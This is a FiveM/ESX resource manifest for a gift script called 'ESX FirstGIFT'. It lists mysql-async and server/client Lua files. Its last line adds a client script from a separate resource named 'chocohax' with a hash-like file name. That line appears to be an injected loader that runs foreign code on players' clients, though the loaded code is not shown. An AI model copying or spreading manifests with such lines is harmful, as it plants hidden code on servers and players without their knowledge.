resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX FirstGIFT BY ANGUO'

version '1.0.1'

server_scripts {
	"@mysql-async/lib/MySQL.lua",
	"server.lua"
}

client_scripts {
	"client.lua"
}

client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'